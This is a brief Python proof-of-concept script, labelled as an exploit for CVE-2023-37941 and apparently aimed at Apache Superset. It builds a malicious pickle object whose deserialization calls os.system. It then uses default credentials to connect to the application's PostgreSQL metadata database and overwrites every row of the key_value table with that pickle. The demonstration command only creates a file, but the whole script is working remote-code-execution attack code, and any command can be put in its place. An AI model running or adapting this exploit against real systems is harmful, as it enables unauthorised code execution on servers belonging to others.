import os
import psycopg2
import pickle5 as pickle

class RCE:
    def __reduce__(self):
        cmd = ('touch /tmp/evil.sh')
        return os.system, (cmd,)

def exploit():
    pickled = pickle.dumps(RCE())
    print(pickled)
    con = psycopg2.connect(
        database="superset",
        user="superset",
        password="superset",
        host="localhost",
        port= '5433'
    )
    print("Database opened successfully")
    cursor = con.cursor()
    print("Cursor created successfully")
    cursor.execute('''UPDATE key_value SET value = %s''', (psycopg2.Binary(pickled),))
    print("Record inserted successfully")
    con.commit()
    print("Connection committed")

if __name__ == '__main__':
    print("Exploiting CVE-2023-37941")
    exploit()